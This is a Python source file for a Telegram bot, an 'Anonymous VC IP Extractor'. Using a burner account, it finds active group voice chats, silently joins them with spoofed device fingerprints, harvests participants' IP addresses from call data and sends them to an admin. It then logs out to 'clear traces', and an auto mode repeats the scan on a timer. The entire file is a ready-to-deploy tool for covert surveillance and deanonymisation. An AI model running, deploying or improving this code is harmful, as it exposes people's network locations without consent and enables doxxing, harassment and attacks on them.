"""
RAILWAY DEPLOYMENT READY - ANONYMOUS VC IP EXTRACTOR
Fully working version with all fixes
"""

import asyncio
import json
import os
import random
import re
import socket
import sys
import logging
from datetime import datetime
from typing import List, Dict, Any, Optional

from pyrogram import Client
from pyrogram.raw import functions, types
from pyrogram.errors import FloodWait
from dotenv import load_dotenv

# ============================================
# LOAD ENVIRONMENT VARIABLES
# ============================================

load_dotenv()

# ============================================
# SETUP LOGGING
# ============================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
LOGGER = logging.getLogger(__name__)

# ============================================
# RAILWAY ENVIRONMENT CHECK
# ============================================

if os.getenv("RAILWAY_ENVIRONMENT") or os.getenv("RAILWAY_SERVICE_ID"):
    LOGGER.info("🚂 Running on Railway")
    LOGGER.info(f"🐍 Python version: {sys.version}")
    LOGGER.info(f"📁 Current directory: {os.getcwd()}")

# ============================================
# CONFIGURATION FROM ENVIRONMENT VARIABLES
# ============================================

API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
SESSION_STRING = os.getenv("SESSION_STRING", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
AUTO_MODE = os.getenv("AUTO_MODE", "false").lower() == "true"
SCAN_INTERVAL = int(os.getenv("SCAN_INTERVAL", 300))

# ============================================
# VALIDATION
# ============================================

if not all([API_ID, API_HASH, SESSION_STRING, BOT_TOKEN, ADMIN_ID]):
    LOGGER.error("❌ Missing required environment variables!")
    LOGGER.error("Required: API_ID, API_HASH, SESSION_STRING, BOT_TOKEN, ADMIN_ID")
    LOGGER.error(f"API_ID: {'✅' if API_ID else '❌'}")
    LOGGER.error(f"API_HASH: {'✅' if API_HASH else '❌'}")
    LOGGER.error(f"SESSION_STRING: {'✅' if SESSION_STRING else '❌'}")
    LOGGER.error(f"BOT_TOKEN: {'✅' if BOT_TOKEN else '❌'}")
    LOGGER.error(f"ADMIN_ID: {'✅' if ADMIN_ID else '❌'}")
    sys.exit(1)

# ============================================
# ANONYMOUS VC EXTRACTOR CLASS
# ============================================

class AnonymousVCExtractor:
    def __init__(self, session_string: str):
        """Initialize with burner account session"""
        self.session_string = session_string
        self.extracted_ips = []
        self.client = None
        
    async def extract_ips(self, chat_id: int, call_id: int, call_hash: int) -> List[str]:
        """Extract IPs from voice chat without leaving traces"""
        device = self._random_device()
        dc_id = random.choice([1, 2, 3, 4, 5])
        
        self.client = Client(
            f"ghost_{random.randint(1000, 9999)}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=self.session_string,
            dc_id=dc_id,
            device_model=device['model'],
            system_version=device['os'],
            app_version=random.choice(["10.0.0", "10.1.0", "10.2.0"])
        )
        
        try:
            async with self.client:
                LOGGER.info(f"🕵️ Connected with device: {device['model']} (DC: {dc_id})")
                
                my_peer = await self.client.resolve_peer('me')
                ice_params = self._generate_ice_params()
                
                # Join VC
                LOGGER.info(f"📞 Joining VC: {call_id}")
                
                await self.client.invoke(
                    functions.phone.JoinGroupCall(
                        call=types.InputGroupCall(
                            id=call_id,
                            access_hash=call_hash
                        ),
                        join_as=my_peer,
                        params=types.DataJSON(
                            data=json.dumps(ice_params)
                        ),
                        muted=True,
                        video_stopped=True,
                        invite_hash=None,
                    )
                )
                
                LOGGER.info("✅ Joined successfully")
                
                # Wait for connection
                await asyncio.sleep(random.uniform(2, 4))
                
                # Get call info
                group_call = await self.client.invoke(
                    functions.phone.GetGroupCall(
                        call=types.InputGroupCall(
                            id=call_id,
                            access_hash=call_hash
                        ),
                        limit=100,
                    )
                )
                
                # Extract IPs
                self.extracted_ips = self._extract_ips_from_call(group_call)
                LOGGER.info(f"🎯 Extracted {len(self.extracted_ips)} IPs")
                
                # Leave call
                try:
                    await self.client.invoke(
                        functions.phone.LeaveGroupCall(
                            call=types.InputGroupCall(
                                id=call_id,
                                access_hash=call_hash
                            ),
                            source=0
                        )
                    )
                    LOGGER.info("👋 Left VC")
                except Exception as e:
                    LOGGER.warning(f"Leave error: {e}")
                
                # Clear traces
                await self._clear_traces()
                
                return self.extracted_ips
                
        except FloodWait as e:
            LOGGER.warning(f"⏳ Flood wait: {e.value} seconds")
            await asyncio.sleep(e.value)
            return []
            
        except Exception as e:
            LOGGER.error(f"❌ Extraction error: {e}")
            # Try to leave if still in call
            try:
                await self.client.invoke(
                    functions.phone.LeaveGroupCall(
                        call=types.InputGroupCall(
                            id=call_id,
                            access_hash=call_hash
                        ),
                        source=0
                    )
                )
            except:
                pass
            return []
    
    def _generate_ice_params(self) -> Dict[str, Any]:
        """Generate random ICE parameters"""
        return {
            "ufrag": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)),
            "pwd": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
            "fingerprints": [],
            "ssrc": random.randint(100000, 999999),
            "rtcp-mux": True,
            "audio": True,
            "video": False
        }
    
    def _random_device(self) -> Dict[str, str]:
        """Generate random device fingerprint"""
        devices = [
            {"model": "iPhone 15 Pro Max", "os": "iOS 17.2"},
            {"model": "Samsung Galaxy S24 Ultra", "os": "Android 14"},
            {"model": "Google Pixel 8 Pro", "os": "Android 14"},
            {"model": "OnePlus 12", "os": "Android 14"},
            {"model": "Xiaomi 14 Pro", "os": "Android 14"},
            {"model": "Nothing Phone 2", "os": "Android 14"},
        ]
        return random.choice(devices)
    
    def _extract_ips_from_call(self, group_call) -> List[str]:
        """Extract all IPs from call data"""
        ips = []
        try:
            # Get params data
            params_data = getattr(group_call.call, "params", None)
            if params_data:
                parsed = json.loads(params_data.data)
                
                # Extract from endpoints
                endpoints = parsed.get("endpoints", [])
                for endpoint in endpoints:
                    ip = self._extract_ip(endpoint)
                    if ip and ip not in ips:
                        ips.append(ip)
                
                # Extract from servers
                servers = parsed.get("servers", [])
                for server in servers:
                    if isinstance(server, dict):
                        ip = server.get("ip") or server.get("host")
                        if ip and ip not in ips and self._is_valid_ip(ip):
                            ips.append(ip)
                
                # Deep extraction
                self._deep_extract_ips(parsed, ips)
                
        except Exception as e:
            LOGGER.debug(f"IP extraction parse error: {e}")
        
        # Remove duplicates and invalid
        valid_ips = [ip for ip in ips if self._is_valid_ip(ip)]
        return list(set(valid_ips))
    
    def _deep_extract_ips(self, obj, ips):
        """Recursively extract IPs from any string"""
        if isinstance(obj, dict):
            for value in obj.values():
                self._deep_extract_ips(value, ips)
        elif isinstance(obj, list):
            for item in obj:
                self._deep_extract_ips(item, ips)
        elif isinstance(obj, str):
            # Find all IPv4 addresses in string
            ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
            found = re.findall(ip_pattern, obj)
            for ip in found:
                if ip not in ips and self._is_valid_ip(ip):
                    ips.append(ip)
    
    def _extract_ip(self, endpoint: str) -> Optional[str]:
        """Extract IP from endpoint string"""
        if not endpoint:
            return None
        
        # Try IPv4 with port
        if ':' in endpoint:
            parts = endpoint.rsplit(':', 1)
            if len(parts) == 2:
                ip = parts[0]
                if self._is_valid_ip(ip):
                    return ip
        
        # Try just IPv4
        if self._is_valid_ip(endpoint):
            return endpoint
            
        return None
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Check if string is valid IPv4"""
        if not ip or not isinstance(ip, str):
            return False
        try:
            socket.inet_aton(ip)
            return True
        except:
            return False
    
    async def _clear_traces(self):
        """Clear session traces"""
        try:
            if self.client:
                # Logout
                await self.client.invoke(functions.auth.LogOut())
                
                # Delete session file
                if hasattr(self.client, 'session_name'):
                    session_file = self.client.session_name + ".session"
                    if os.path.exists(session_file):
                        os.remove(session_file)
                LOGGER.info("🧹 Traces cleared")
        except Exception as e:
            LOGGER.debug(f"Clear traces error: {e}")

# ============================================
# TELEGRAM BOT HANDLER
# ============================================

class VCExtractorBot:
    def __init__(self):
        """Initialize bot"""
        self.bot = Client(
            "vc_bot",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN
        )
        self.extractor = AnonymousVCExtractor(SESSION_STRING)
        self.running = True
        
    async def start(self):
        """Start the bot"""
        
        @self.bot.on_message()
        async def handle_message(client, message):
            # Only respond to admin
            if message.from_user.id != ADMIN_ID:
                await message.reply("❌ Unauthorized")
                return
            
            # Handle commands
            if message.text.startswith('/start'):
                await message.reply(
                    "🕵️ **Anonymous VC IP Extractor**\n\n"
                    "**Commands:**\n"
                    "/scan - Scan active voice chats\n"
                    "/extract - Extract IPs from VC\n"
                    "/status - Check bot status\n"
                    "/stop - Stop all operations\n\n"
                    f"🔧 Admin ID: {ADMIN_ID}"
                )
            
            elif message.text.startswith('/scan'):
                await self.handle_scan(message)
            
            elif message.text.startswith('/extract'):
                args = message.text.split()
                if len(args) >= 4:
                    try:
                        chat_id = int(args[1])
                        call_id = int(args[2])
                        call_hash = int(args[3])
                        await self.handle_extract(message, chat_id, call_id, call_hash)
                    except ValueError:
                        await message.reply("❌ Invalid IDs. Must be numbers.")
                else:
                    await message.reply(
                        "Usage: `/extract <chat_id> <call_id> <call_hash>`\n\n"
                        "First use /scan to get these values."
                    )
            
            elif message.text.startswith('/status'):
                await message.reply(
                    f"✅ **Bot is running**\n"
                    f"📱 Admin ID: `{ADMIN_ID}`\n"
                    f"🔄 Auto Mode: `{AUTO_MODE}`\n"
                    f"⏱️ Scan Interval: `{SCAN_INTERVAL}s`\n"
                    f"🌐 Environment: `{'Railway' if os.getenv('RAILWAY_ENVIRONMENT') else 'Local'}`"
                )
            
            elif message.text.startswith('/stop'):
                self.running = False
                await message.reply("🛑 Stopping bot...")
                # Force exit after 2 seconds
                await asyncio.sleep(2)
                sys.exit(0)
        
        # Start the bot
        LOGGER.info("🤖 Starting bot...")
        await self.bot.start()
        
        me = await self.bot.get_me()
        LOGGER.info(f"✅ Bot started as @{me.username}")
        
        # Send startup message
        try:
            await self.bot.send_message(
                ADMIN_ID,
                "🕵️ **Anonymous VC Extractor is online!**\n\n"
                f"🤖 Bot: @{me.username}\n"
                f"📱 Admin: `{ADMIN_ID}`\n"
                f"🔄 Auto Mode: `{AUTO_MODE}`\n\n"
                "Use /scan to find active voice chats\n"
                "Use /extract to extract IPs"
            )
            LOGGER.info("📤 Startup message sent to admin")
        except Exception as e:
            LOGGER.error(f"Failed to send startup message: {e}")
        
        # Run auto mode if enabled
        if AUTO_MODE:
            LOGGER.info("🔄 Auto mode enabled - starting scan loop")
            asyncio.create_task(self.auto_scan_loop())
        
        # Keep running
        LOGGER.info("✅ Bot is running. Waiting for commands...")
        while self.running:
            await asyncio.sleep(1)
    
    async def handle_scan(self, message):
        """Scan for active voice chats"""
        status = await message.reply("🔍 Scanning for active voice chats...")
        
        try:
            # Create scanner client
            scanner = Client(
                "scanner",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=SESSION_STRING
            )
            
            async with scanner:
                vcs = []
                async for dialog in scanner.get_dialogs(limit=50):
                    chat = dialog.chat
                    if not chat:
                        continue
                        
                    try:
                        if chat.type in ["group", "supergroup"]:
                            peer = await scanner.resolve_peer(chat.id)
                            
                            if isinstance(peer, types.InputPeerChannel):
                                full = await scanner.invoke(
                                    functions.channels.GetFullChannel(
                                        channel=types.InputChannel(
                                            channel_id=peer.channel_id,
                                            access_hash=peer.access_hash
                                        )
                                    )
                                )
                            else:
                                full = await scanner.invoke(
                                    functions.messages.GetFullChat(
                                        chat_id=peer.chat_id
                                    )
                                )
                            
                            call = getattr(full.full_chat, "call", None)
                            if call:
                                vcs.append({
                                    "title": chat.title or f"Chat {chat.id}",
                                    "chat_id": chat.id,
                                    "call_id": call.id,
                                    "call_hash": call.access_hash
                                })
                    except Exception as e:
                        LOGGER.debug(f"Error checking {chat.id}: {e}")
                
                if not vcs:
                    await status.edit_text("❌ No active voice chats found")
                    return
                
                # Format response
                response = "📞 **Active Voice Chats Found:**\n\n"
                for idx, vc in enumerate(vcs, 1):
                    response += f"{idx}. **{vc['title']}**\n"
                    response += f"   Chat ID: `{vc['chat_id']}`\n"
                    response += f"   Call ID: `{vc['call_id']}`\n"
                    response += f"   Call Hash: `{vc['call_hash']}`\n\n"
                
                response += "Use `/extract <chat_id> <call_id> <call_hash>` to extract IPs"
                
                await status.edit_text(response)
                
        except Exception as e:
            LOGGER.error(f"Scan error: {e}")
            await status.edit_text(f"❌ Scan failed: `{e}`")
    
    async def handle_extract(self, message, chat_id, call_id, call_hash):
        """Extract IPs from VC"""
        status = await message.reply("🕵️ Extracting IPs from voice chat...\n⏳ This may take 5-10 seconds...")
        
        try:
            LOGGER.info(f"🔄 Extracting IPs from chat {chat_id}, call {call_id}")
            
            ips = await self.extractor.extract_ips(chat_id, call_id, call_hash)
            
            if not ips:
                await status.edit_text(
                    "❌ No IPs extracted\n\n"
                    "Possible reasons:\n"
                    "• VC is empty\n"
                    "• No permission to join\n"
                    "• All participants use relay\n"
                    "• Extraction failed"
                )
                return
            
            # Format response
            response = "🎯 **Extracted IPs:**\n\n"
            for idx, ip in enumerate(ips, 1):
                response += f"{idx}. `{ip}`\n"
            
            response += f"\n📊 **Total:** {len(ips)} IPs"
            response += f"\n⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            await status.edit_text(response)
            
            # Save to file for history (Railway compatible)
            try:
                with open("extracted_ips.txt", "a") as f:
                    f.write(f"{datetime.now()}: {ips}\n")
            except:
                pass
                
        except Exception as e:
            LOGGER.error(f"Extraction error: {e}")
            await status.edit_text(f"❌ Extraction failed: `{e}`")
    
    async def auto_scan_loop(self):
        """Auto scan and extract loop"""
        LOGGER.info("🔄 Auto scan loop started")
        
        while self.running:
            try:
                LOGGER.info("🔍 Running auto scan...")
                
                # Scan for VCs
                scanner = Client(
                    "auto_scanner",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    session_string=SESSION_STRING
                )
                
                async with scanner:
                    async for dialog in scanner.get_dialogs(limit=50):
                        if not self.running:
                            break
                            
                        chat = dialog.chat
                        if not chat or chat.type not in ["group", "supergroup"]:
                            continue
                            
                        try:
                            peer = await scanner.resolve_peer(chat.id)
                            
                            if isinstance(peer, types.InputPeerChannel):
                                full = await scanner.invoke(
                                    functions.channels.GetFullChannel(
                                        channel=types.InputChannel(
                                            channel_id=peer.channel_id,
                                            access_hash=peer.access_hash
                                        )
                                    )
                                )
                            else:
                                full = await scanner.invoke(
                                    functions.messages.GetFullChat(
                                        chat_id=peer.chat_id
                                    )
                                )
                            
                            call = getattr(full.full_chat, "call", None)
                            if call:
                                LOGGER.info(f"📞 Found active VC in {chat.title}")
                                
                                # Extract IPs
                                ips = await self.extractor.extract_ips(
                                    chat.id,
                                    call.id,
                                    call.access_hash
                                )
                                
                                if ips:
                                    # Send results
                                    response = "🎯 **Auto Extracted IPs:**\n\n"
                                    for idx, ip in enumerate(ips[:10], 1):
                                        response += f"{idx}. `{ip}`\n"
                                    
                                    response += f"\n📊 Total: {len(ips)} IPs"
                                    response += f"\n📌 Group: {chat.title}"
                                    response += f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                                    
                                    await self.bot.send_message(ADMIN_ID, response)
                                    LOGGER.info(f"📤 Sent {len(ips)} IPs to admin")
                                    
                        except Exception as e:
                            LOGGER.debug(f"Auto scan error for {chat.id}: {e}")
                
                # Wait for next scan
                LOGGER.info(f"⏳ Waiting {SCAN_INTERVAL} seconds before next scan...")
                await asyncio.sleep(SCAN_INTERVAL)
                
            except Exception as e:
                LOGGER.error(f"Auto scan loop error: {e}")
                await asyncio.sleep(60)

# ============================================
# MAIN
# ============================================

async def main():
    """Main entry point"""
    LOGGER.info("=" * 60)
    LOGGER.info("🚂 Starting Anonymous VC Extractor")
    LOGGER.info("=" * 60)
    LOGGER.info(f"📱 Admin ID: {ADMIN_ID}")
    LOGGER.info(f"🔄 Auto Mode: {AUTO_MODE}")
    LOGGER.info(f"⏱️ Scan Interval: {SCAN_INTERVAL}s")
    LOGGER.info(f"🐍 Python: {sys.version}")
    LOGGER.info(f"📁 Working Directory: {os.getcwd()}")
    LOGGER.info("=" * 60)
    
    bot = VCExtractorBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        LOGGER.info("👋 Shutting down...")
    except Exception as e:
        LOGGER.error(f"❌ Fatal error: {e}")
        raise

if __name__ == "__main__":
    try:
        LOGGER.info("🚀 Starting bot process...")
        asyncio.run(main())
    except KeyboardInterrupt:
        LOGGER.info("👋 Goodbye!")
        sys.exit(0)
    except Exception as e:
        LOGGER.error(f"❌ Fatal error: {e}")
        sys.exit(1)
